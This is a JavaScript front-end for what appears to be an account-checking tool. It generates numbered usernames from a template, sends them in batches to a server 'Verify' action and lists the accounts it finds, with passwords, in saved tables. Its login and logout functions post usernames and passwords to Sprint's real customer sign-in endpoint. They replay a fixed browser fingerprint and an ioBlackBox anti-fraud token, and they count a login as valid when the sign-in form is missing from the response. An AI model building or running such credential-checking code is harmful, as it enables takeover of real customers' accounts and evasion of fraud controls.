var APP = {};

APP.table = {
};




APP.getID = function () {
  function s4() {
    return Math.floor((1 + Math.random()) * 0x10000)
      .toString(16)
      .substring(1);
  }
  return s4() + s4() + '-' + s4() + '-' + s4() ;
};

APP.loader = {
	line:function(){
		return $($('.loader .line').html());
	},
	circle:function(){
		return $($('.loader .circle').html());
	}
};

APP.chunk = function(arr, len) {

  var chunks = [],
      i = 0,
      n = arr.length;

  while (i < n) {
    chunks.push(arr.slice(i, i += len));
  }

  return chunks;
};

APP.progressing = function(array, next, finish) {
    var limit_ = array.length;


    var porsent_from = function(unid, total) {
        var valor = unid;
        var inicio = 100;
        var divisor = total;
        var porsiento = inicio / divisor;
        var estatico = porsiento;
        var obtenido = (estatico * valor);
        return obtenido;
    };

    var start_ = function(cont) {

        if (cont < limit_) {

        	var data = { in: cont,
                limit: limit_,
                selected: array[cont],
                porcent: porsent_from(cont, limit_)
            };
            
            if(cont == limit_-1){
            	data["beforeLast"] = true;
            };

            next(data, function() {
                cont++;
                start_(cont);
            });
        } else {
            finish({ in: cont,
                limit: limit_,
                porcent: porsent_from(cont, limit_)
            });
        };

    };

    start_(0);

};


APP.storage = {
	get:function(name,optional_data){

		var local = localStorage[name];

		if(!local && !optional_data) return false;
		if(!local && optional_data){
		    if (typeof optional_data == "object") { optional_data = JSON.stringify(optional_data); };
			localStorage[name] = optional_data;
			var returner = localStorage[name];
			try{ returner = JSON.parse(returner); }catch(r){};
			return returner;
		};

		try{ local = JSON.parse(local); }catch(r){};
		return local;

	},
	set:function(name,value){
		
		if (typeof value == "object") { value = JSON.stringify(value); };

	   localStorage[name] = value;
	}
};

APP.getlist = function(user,where){
	var this_ = this;
	return new Promise(function(resolve){
		this_.storage.get('LIST').then(function(saved){
				resolve(saved);
		}, function(){
			this_.storage.set('LIST',{}).then(function(data){
				resolve({});
			});
		});
	});
};

APP.item = function(user,where){
	if(APP.table[where][user.id]) return "";
	return '<li data-name="'+user.id+'">'+user.name+' <span class="badge badge-success changepassword">change</span></li>';
};

APP.userGen = function(name){
	var this_ = this;
	return {
		id:this_.getID(),
		name:name
	};
};

APP.verifyType = function(data){
    var doc = $('<div />',{html:data});
    return doc.find('#lblSSN').length ? "normal":"bussines";
};

APP.logout = function(){
	return new Promise(function(resolve,reject){
		$.post('https://mysprint.sprint.com/entrycheck/logout.fcc','TARGET=https%3A%2F%2Fmysprint.sprint.com%2Fmysprint%2FLogoutHandler%3FtargetURL%3Dhttps%3A%2F%2Fmysprint.sprint.com%252Fmysprint%252Fpages%252Fsl%252Fglobal%252Findex.jsp%253Fsmlogout%253Dtrue%2526INTNAV%253DTopNav%3ASignout')
		.done(resolve)
		.fail(reject)
	});
};

APP.nameGenerator = function(data){

	var init = data.init;
	var limit = data.limit;
	var name = data.name;
	var names = [];

	init = parseInt(init);
	limit = parseInt(limit);
	
	console.log(init,limit,data);

	for (var i = init; i <= limit; i++) {

		var generate = name;
		var find_ = '{{UP}}';
		var find_2 = '{{.}}';
		var find_3 = '{{-}}';
		var find_4 = '{{_}}';

		if( generate.indexOf(find_) > -1 ) { generate = generate.split(find_).join(i);  };

		if( generate.indexOf(find_2) > -1 ){ generate = generate.split(find_2).join('.');  };
		if( generate.indexOf(find_3) > -1 ){ generate = generate.split(find_3).join('-'); };
		if( generate.indexOf(find_4) > -1 ){ generate = generate.split(find_4).join('_');  };
		names.push(generate);
	};

	return names;

};

APP.login = function(user){
	
	var this_ = this;

	return new Promise(function(resolve,reject){

		this_.logout().then(function(){

		  $.ajax({
		  	    method:"POST",
			    url: "https://mysprint.sprint.com/entrycheck/login.fcc",
			    data:{
					"honey_pot": "",
					"USER": user.username,
					"PASSWORD": user.password,
					"LOGINMODE": "deepLinkURL",
					"target": "/mysprint/pages/secure/SigninServlet?targetPage%3Dhttps%3A%2F%2Fwww.sprint.com%2Fapi%2Fdigital%2Fauth%2Fauthentication%3FkmsiPref%253D0%2526destinationURL%253Dhttps%253A%252F%252Fwww.sprint.com%252Fcontent%252Fsprint%252Fsprint_com%252Fus%252Fen%252Fmy-sprint.html%2526referrerUrl%253Dhttps%253A%252F%252Fwww.sprint.com%252Fen%252Fsupport.html",
					"pm_fp": "version%3D1%26pm%5Ffpua%3Dmozilla%2F5%2E0%20%28windows%20nt%2010%2E0%3B%20win64%3B%20x64%29%20applewebkit%2F537%2E36%20%28khtml%2C%20like%20gecko%29%20chrome%2F60%2E0%2E3112%2E101%20safari%2F537%2E36%7C5%2E0%20%28Windows%20NT%2010%2E0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537%2E36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F60%2E0%2E3112%2E101%20Safari%2F537%2E36%7CWin32%26pm%5Ffpsc%3D24%7C1536%7C864%7C824%26pm%5Ffpsw%3D%26pm%5Ffptz%3D%2D8%26pm%5Ffpln%3Dlang%3Den%2DUS%7Csyslang%3D%7Cuserlang%3D%26pm%5Ffpjv%3D0%26pm%5Ffpco%3D1",
					"ioBlackBox": "0400CIfeAe15Cx8Nf94lis1zthsEKnBjBXXQ728uQ/b020cmy1L5l9DD/v2y/GQ/we2BZp8/dGFCsvV2KT4EIhFconQ+rlIMTewV8wZ4Emlv1NY/yoVIBnjain3l6hbzqbSTAkfQjwmMuK2agMv4aacBHsPE1rJG/4/hh0ylJGfM1m5dSDvFsQ9SoZVCXTMVxC6QgriaMoAypQuyPr0t8ztVFisjUV4dJsOym9ceHDKRCiK4xI1RTIYC8ouD71qCKcmZqa+c5UMfdLNXqLz+1vlqUAr9dE2jcfl0wgroQBfpyuL3PGYR9ZvB91UUOH/ZsM09VTw2C4oQ2p5KKlg2xwOLLtPtb5t32w+KNe6lc5j8/vI4yLzbjaSmiRgjswaTpbBO9yjeY6KrRm+ahxyOAFBimoscMGnPwPDo898GnyP1mByi0OiVQDFm0fhpTij77HNIYmH70/9WYFg+nfDOmPoZ5L/Xjr7Mr0wVVRiuuhFxLmg9GC17jlnhcx5rQHZJ3f6Cyn9oYcKrLSfq4WCiHMbq2EnEh+Ts3ED0NeUgApJ4+QbV4d+RnQegnNK3Sga2t5uGzvd4SbVYKQDbms9zY2D+oLKTIdxDHEWafv7tOhDqP1BGJ/RBTEX78VYLhnQo+ZYX6X/1hKzdD1FxREpKJg5h2/rJz/fklocMaR4LlIcIcs8hIqKrjK+gd47DZ9zXWLO31jiaIHrdqNjXm0XBtvk2RW2s0fO33l4+Bez6hBBzrS2usa2jjh0Vn+TQHjy7H5XhLHCHAGY3J0jpLqVrSVzsI1LB6M5fl2EoMEAoEitEttFUo1DRkUtPGG4lkbMj5hta0//2N3v+ZJl4VShbY+EVBDdML6ZhV5yEfobiOhcONJPNnBg89k56rNOHjs7HO5CL//li8nYbsqKV1/B3exlsY+b8dIdPEb9km9ceHDKRCiLCgbgXPmizjHlWmCRBdNDNsuaxAwAEbRdjjZSkBTBViHxgPVj4eN/NGYWc8AmavPDokDPyjS60wMTSxsJM2OXSjRQId0CMugsmxTEkNjzXssyRCvJOaRNkWb98as8+cvpv1ULMC5QYeSoXKcJjwaxsHyGqUbqXoYeWqUJXaQ203lZesVKm0ujjDKThVP1hAyBTju8Izs6/KBQ1h4tNGHTh8CNjY0flnyuelCnt2ypgfW/m3Zqxt3w1Bn6LxoWOnZu64rr07LwRGXZpyc7oQIV63xadNE2jqb6o3IAEdbB+xBDlc5ibQ6opsC2ODMcwYCSmkgFp7tSI9InUPcpWx610h4YkiGOKAhy7pxFTVNbEHGg3TA0jEXdgQUIMVfx/KTpSF0Tm5ljUieZUkvow0DWLSTLH/uUR+Our4q+sIIsVPntYUZBrGhTpZ9AEqMdTCFtD79ToKP8bC8/6Z+s2XBfUiuv6Xcf4KsI17qVzmPz+8jjIvNuNpKaJGCOzBpOlsE73KN5joqtGb5qHHI4AUGKa9m94gpakT1E="
				},
			    error: function(error){
			    	console.log(error)
			        reject(user);
			    },
			    success: function(data){
			    	if(!$('<div />',{html:data}).find('[name="signinForm"]').length) {
			    		return resolve(user);
			    	}else{
			    		return reject(user);
			    	}
			    },
			    timeout: 3000, // sets timeout to 3 seconds,
			    async: false,
			    type:"json"
			});

		},function(error){
	        reject({error:error});
		})

	});
};


APP.verifyUser = function($users){
	
	var this_ = this;

	return new Promise(function(resolve,reject){

		  $.ajax({
		  	    method:"POST",
			    url: "./ajax.php",
			    data:{action:{Verify:$users}},
			    error: function(error){
			    	try { error = JSON.parse(error); } catch(e) { };
			        reject(error);
			    },
			    success: function(data){
			    	try { data = JSON.parse(data); } catch(e) { };
			    	return resolve(data);
			    },
			    type:"json"
			});


	});
};

APP.hasPassword = function(pass){
	if(pass){
	   return pass;
	}else{
		return '<button class="btn generate">Generate</button>';
	}
};

APP.renderDate = function(timestamp){

	var dateObj = new Date(timestamp*1000);
	var month = dateObj.getUTCMonth() + 1; //months from 1-12
	var day = dateObj.getUTCDate();
	var year = dateObj.getUTCFullYear();

	newdate = year + "/" + month + "/" + day;
	return newdate;

};

APP.renderusers = function(users){
	var this_ = this;
	var accounts_saved = this_.storage.get('ACCOUNTS',{});

	$.each(users,function(index,user){

		var is_error = user.error;

		if(!is_error){

			var html = '<tr data-id="'+user.id+'" data-type="'+user.type+'" data-name="'+user.name+'" > <td>'+user.name+'</td> <td>'+this_.hasPassword(user.password)+'</td> <td>'+this_.renderDate(user.date)+'</td> <td><button class="btn red delete">Delete</button></td> </tr>';
			html = $(html);

			console.log(user);

			if(this_.table[user.type]){
		        if(!accounts_saved[user.type]) accounts_saved[user.type] = {};
		        
		        accounts_saved[user.type][user.id] = user;

				if(this_.table[user.type].element_exsits(user.id)){
					var element = this_.table[user.type].element_exsits(user.id);
					element.before(html);
					element.remove();
				}else{
					this_.table[user.type].add(html);
				};

				
			};

		}else{
			Materialize.toast(is_error, 4000);
		}

	});

	this_.storage.set('ACCOUNTS',accounts_saved);
};

jQuery(document).ready(function($) {

	APP.loteboard = $('#lote').modal();
	APP.account_set = $('#account_set').modal();

	$("#start").click(function(event) {
		
		var  info = {
			init:$('#init').val(),
			limit:$('#limit').val(),
			name:$('#username').val(),
		};

		console.log(info)

		if(!info.name) Materialize.toast('Type a name in field', 4000);

		APP.loteboard.find('#lotes').html('');

		var names = APP.nameGenerator(info);

		var chunk_names = APP.chunk(names,10);

		APP.loteboard.modal('open');

			APP.progressing(chunk_names,function(data,next){

				var names_selected = data.selected;

				(function(lote,data){

					var name_lote = "Lote_ "+data.in + ": "+lote.toString(); 
					var lote_id = btoa(name_lote);
					var loaders = APP.loader.line();

					var create_loteelement = $('<li />',{id:lote_id,class:"collection-item"})
					.append($('<div />',{html:name_lote}))
					.append(loaders);

					APP.loteboard.find('#lotes').append(create_loteelement)

					setTimeout(function(){
						APP.verifyUser(lote).then(function(success){

							console.log(success);

						  APP.renderusers(success);

						  loaders.before('<h5>Finish<h5>');
						  loaders.remove();

						},function(error){
							console.log(error);

						  loaders.before('<h5>Error<h5>');
						  loaders.remove();
						})
					},1000)

					
				})(names_selected,data);

				next();

			},function(){
			  Materialize.toast('Data Sent, Wait A Moment', 4000);
			  APP.loteboard.modal('open');
			});


	});
});


$(document).ready(function() {

	var input_save = APP.storage.get('INPUT_DATA',{});

	$.each(input_save,function(key, value) {
		var selector = '[data-autosave][name="'+key+'"],[data-autosave][id="'+key+'"]';
		$(selector).val(value);
	});


	$(document).on('keyup change', '[data-autosave]', function(event) {
		var input_save = APP.storage.get('INPUT_DATA',{});
  		var name_ = $(this).attr('id') ? $(this).attr('id') : $(this).attr('name');
  		input_save[name_] =  $(this).val();
  		APP.storage.set('INPUT_DATA',input_save);
  	});



  $('.datatable').each(function(index, $ele) {

  	var $ele = $($ele);
  	var name = $ele.data('name');

  	APP.table[name] = {
  		element:$ele,
  		add:function(html){
  			var this_ = this;
  			this_.element.find('tbody').prepend(html);
  		},
  		element_exsits:function(id){
  			var this_ = this;
  			return this_.element.find('tbody').find('[data-id="'+id+'"]').length ? this_.element.find('tbody').find('[data-id="'+id+'"]') : false;
  		},
  		remove:function(id){
  			var this_ = this;
  			if(this_.element_exsits(id)){
  				this_.element_exsits(id).hide('200',function(){
  					this.remove();
  				});
  			}

  		}
  	};

  });

  	var data_saved = APP.storage.get('ACCOUNTS',{});

  	$.each(data_saved,function(type_saved,$items){

  		if(type_saved.indexOf('saved') > -1) delete data_saved[type_saved];

  		var table_ = "saved"+type_saved;

  		var clone_items = JSON.parse(JSON.stringify($items));

  		$.each(clone_items,function(key, item) {
  			if (item.type.indexOf('saved') > -1) { item.type = item.type.split('saved').join(''); }
  			item.type = "saved"+item.type;
  		});
  		
  		APP.renderusers(clone_items);

  	});
    
    APP.storage.set('ACCOUNTS',data_saved);


  	$(document).on('click', '.delete', function(event) {
  		event.preventDefault();
  		var element = $(this);
  		var parent = element.closest('[data-id]');
  		var id = parent.data('id');
  		var type_ = parent.data('type');
		if(type_.indexOf('saved') > -1) type_ = type_.replace('saved','');

        var saved_data = APP.storage.get('ACCOUNTS',{});

  		if(saved_data[type_]){
  			APP.table[parent.data('type')].remove(id);
  			delete saved_data[type_][id];
  			APP.storage.set('ACCOUNTS',saved_data);
  		}
  	});

   setInterval( function(){
   	 $('[id*="changepasword"]').each(function(index, element) {
   	 	var data = element.value;
   	 	try { data = JSON.parse(data); } catch(e) { };

        var saved_data = APP.storage.get('ACCOUNTS',{});
  		var id = data.id;
  		var type = data.type;
  		if(type.indexOf('saved') > -1) type = type.replace('saved','');
  		saved_data[type][id] = data;

   	 	APP.renderusers([data]);

		APP.storage.set('ACCOUNTS',saved_data);

   	 	element.remove();
   	 });
   },400);
});